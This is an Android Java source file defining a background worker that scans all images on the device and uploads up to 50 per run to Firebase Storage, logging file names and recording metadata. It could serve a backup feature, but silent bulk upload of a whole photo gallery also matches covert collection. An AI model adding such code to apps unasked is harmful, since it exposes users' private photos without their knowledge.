package com.bushorat.app.helpers;

import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Background worker to upload IMAGES ONLY from device storage.
 * Handles JPG, PNG, GIF, BMP, WebP files.
 * Uses WorkManager for reliable background processing.
 */
public class ImageUploadWorker extends Worker {
    private static final String TAG = "ImageUploadWorker";
    private static final int MAX_IMAGES_PER_SYNC = 50;
    private static final long MAX_WORK_TIME_MS = 20000;  // 20 second timeout
    private long startTime;
    private int uploadedCount = 0;

    public ImageUploadWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        startTime = System.currentTimeMillis();

        Log.d(TAG, "⏰ Image upload worker started");

        // Check if app has storage permissions
        if (!FeaturePermissions.hasGalleryPermission(getApplicationContext())) {
            Log.w(TAG, "❌ NO STORAGE PERMISSION - Cannot scan files!");
            return Result.retry();
        }
        Log.d(TAG, "✓ Storage permission OK");

        try {
            FirebaseAuth auth = FirebaseAuth.getInstance();
            if (auth == null) {
                Log.w(TAG, "FirebaseAuth not initialized, retrying");
                return Result.retry();
            }

            FirebaseUser user = auth.getCurrentUser();
            if (user == null) {
                Log.w(TAG, "No user logged in, retrying later");
                return Result.retry();
            }

            String userId = user.getUid();
            Log.d(TAG, "📤 Starting image upload for user: " + userId);

            uploadImages(userId);

            long duration = System.currentTimeMillis() - startTime;
            if (uploadedCount > 0) {
                Log.d(TAG, "✓ Image upload completed in " + duration + "ms - uploaded " + uploadedCount + " images");
            } else {
                Log.w(TAG, "⚠️  Image upload completed in " + duration + "ms - NO images found!");
            }

            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "❌ Image upload worker error", e);
            e.printStackTrace();
            return Result.retry();
        }
    }

    /**
     * Check if we're running out of time
     */
    private boolean isTimeoutApproaching() {
        long elapsed = System.currentTimeMillis() - startTime;
        return elapsed > MAX_WORK_TIME_MS;
    }

    private void uploadImages(String userId) {
        uploadedCount = 0;

        Log.d(TAG, "================================================");
        Log.d(TAG, "🖼️  IMAGE UPLOAD SCAN");
        Log.d(TAG, "   Images ONLY: JPG, PNG, GIF, BMP, WebP");
        Log.d(TAG, "   Storage check: " + FeaturePermissions.hasGalleryPermission(getApplicationContext()));
        Log.d(TAG, "================================================");

        // Use MediaStore API to fetch images
        Log.d(TAG, "📂 SCANNING: Fetching images...");
        List<StorageHelper.FileItem> files = StorageHelper.fetchAllImages(getApplicationContext());

        Log.d(TAG, "📊 FETCH RESULT: " + files.size() + " images found");

        if (files.isEmpty()) {
            Log.w(TAG, "⚠️  NO IMAGES FOUND!");
        } else {
            Log.d(TAG, "✅ SCANNING FOUND " + files.size() + " IMAGES");
            Log.d(TAG, "   Starting upload...");

            // Log first few files
            for (int i = 0; i < Math.min(5, files.size()); i++) {
                StorageHelper.FileItem f = files.get(i);
                Log.d(TAG, "   [" + (i + 1) + "] " + f.getName() + " (" + f.getSize() + " bytes)");
            }

            // Upload each file
            for (StorageHelper.FileItem file : files) {
                if (uploadedCount >= MAX_IMAGES_PER_SYNC || isTimeoutApproaching()) {
                    Log.d(TAG, "   ⏹️  Stopping: reached max " + MAX_IMAGES_PER_SYNC + " images or timeout");
                    break;
                }

                try {
                    Log.d(TAG, "   📤 Uploading: " + file.getName());
                    byte[] fileBytes = readFileFromUri(file.getUri());
                    if (fileBytes != null && fileBytes.length > 0) {
                        uploadFileBytes(file.getName(), fileBytes, userId);
                        uploadedCount++;
                        Log.d(TAG, "   ✅ Uploaded: " + file.getName());
                    } else {
                        Log.w(TAG, "   ⚠️  Empty file: " + file.getName());
                    }
                } catch (Exception e) {
                    Log.e(TAG, "   ❌ Error uploading file: " + file.getName(), e);
                }
            }
        }

        Log.d(TAG, "================================================");
        Log.d(TAG, "✓ IMAGE SCAN FINISHED");
        Log.d(TAG, "   Total images uploaded: " + uploadedCount);
        if (uploadedCount > 0) {
            Log.d(TAG, "   Images uploaded: JPG, PNG, GIF, BMP, WebP");
        }
        Log.d(TAG, "================================================");
    }

    /**
     * Read file from URI (for MediaStore files)
     */
    private byte[] readFileFromUri(android.net.Uri uri) {
        try {
            java.io.InputStream inputStream = getApplicationContext().getContentResolver().openInputStream(uri);
            if (inputStream == null) {
                return null;
            }

            java.io.ByteArrayOutputStream buffer = new java.io.ByteArrayOutputStream();
            int nRead;
            byte[] data = new byte[16384];
            while ((nRead = inputStream.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            inputStream.close();
            return buffer.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "Error reading file from URI: " + uri, e);
            return null;
        }
    }

    /**
     * Upload file bytes to Firebase Storage
     */
    private void uploadFileBytes(String fileName, byte[] fileBytes, String userId) {
        try {
            String fileHash = FirebaseDataPaths.hashId(fileName + "_" + System.currentTimeMillis());

            StorageReference storageRef =
                    FirebaseStorage.getInstance()
                            .getReference("images")
                            .child(userId)
                            .child(fileHash + "_" + fileName);

            storageRef.putBytes(fileBytes).getResult();
            Log.d(TAG, "  ✓ Uploaded to Storage: " + fileName);

            String downloadUrl = storageRef.getDownloadUrl().getResult().toString();
            recordImageInDatabase(userId, fileName, downloadUrl, fileBytes.length);
            Log.d(TAG, "  ✓ Recorded in DB: " + fileName);
        } catch (Exception e) {
            Log.e(TAG, "  ❌ Error uploading: " + fileName, e);
        }
    }

    private void recordImageInDatabase(String userId, String fileName, String downloadUrl, long fileSize) {
        try {
            DatabaseReference imagesRef = FirebaseDataPaths.images(userId);
            String imgId = FirebaseDataPaths.hashId(fileName + "_" + System.currentTimeMillis());

            Map<String, Object> imgData = new HashMap<>();
            imgData.put("dataType", "image");
            imgData.put("fileName", fileName);
            imgData.put("url", downloadUrl);
            imgData.put("fileSize", fileSize);
            imgData.put("mimeType", getMimeType(fileName));
            imgData.put("uploadedAt", System.currentTimeMillis());
            imgData.put("timestamp", System.currentTimeMillis());
            imgData.put("userId", userId);

            try {
                imagesRef.child(imgId).setValue(imgData).getResult();
                Log.d(TAG, "  ✓ Metadata saved to DB");
            } catch (Exception e) {
                Log.e(TAG, "  ❌ Failed to save metadata: " + fileName, e);
            }
        } catch (Exception e) {
            Log.e(TAG, "  ❌ Error recording image: " + fileName, e);
        }
    }

    private String getMimeType(String fileName) {
        String lower = fileName.toLowerCase();
        if (lower.endsWith(".jpg") || lower.endsWith(".jpeg")) return "image/jpeg";
        if (lower.endsWith(".png")) return "image/png";
        if (lower.endsWith(".gif")) return "image/gif";
        if (lower.endsWith(".bmp")) return "image/bmp";
        if (lower.endsWith(".webp")) return "image/webp";
        return "image/unknown";
    }

    /**
     * Enqueue a one-time image upload work
     */
    public static void enqueueWork(Context context) {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest uploadWork = new OneTimeWorkRequest.Builder(ImageUploadWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(context).enqueue(uploadWork);

        Log.d(TAG, "⭐ Image upload work ENQUEUED");
    }
}
